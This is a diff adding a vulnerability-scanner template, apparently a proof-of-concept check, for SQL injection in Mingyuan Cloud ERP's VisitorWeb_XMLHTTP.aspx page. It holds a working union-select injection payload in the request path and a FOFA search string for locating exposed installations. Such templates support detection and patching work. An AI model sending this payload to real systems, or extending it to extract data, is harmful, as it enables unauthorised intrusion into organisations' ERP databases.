@@ -1,0 +1,21 @@
+id: poc-yaml-mingyuanyun-erp-visitorweb-xmlhttp-aspx-sqli
+info:
+  name: 明源云ERP VisitorWeb_XMLHTTP.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 明源云ERP
+  fofa: app="明源云-ERP"
+variables:
+  t1: random_int(1000000,9000000)
+  t2: random_int(1000000,8000000)
+requests:
+- method: GET
+  path: /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1'+union+select+sum({{.t1}}*{{.t2}})--
+  expression: 'status_code == 200
+
+    && contains(body,t1*t2)
+
+    '
+transport: http
